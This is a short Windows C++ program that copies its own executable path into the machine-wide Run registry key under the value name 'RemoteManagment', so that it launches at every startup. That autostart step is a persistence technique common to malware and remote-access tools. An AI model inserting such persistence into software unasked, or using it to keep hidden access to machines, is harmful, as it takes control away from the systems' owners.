#include "windows.h"
#include <string>

#define RUN_KEY_PATH ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
#define KEY_NAME ("RemoteManagment")

using std::string;

int main(int nargs, char* args[]) {
	string path = args[0];
	size_t path_size = path.size();
	const BYTE* data = (const BYTE*)(path.c_str());
	HKEY keyHandle = 0;
	PHKEY pKeyHandle = &keyHandle;
	LPBYTE keyValue = { 0 };

	LSTATUS status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", pKeyHandle);
	status = RegQueryValueExA(keyHandle, KEY_NAME, 0, NULL, NULL, NULL);
	if (status != ERROR_SUCCESS) {
		status = RegSetValueExA(keyHandle, "RemoteManagment", 0, REG_SZ, data, path_size);
	}
	status = RegCloseKey(keyHandle);

	return 0;
}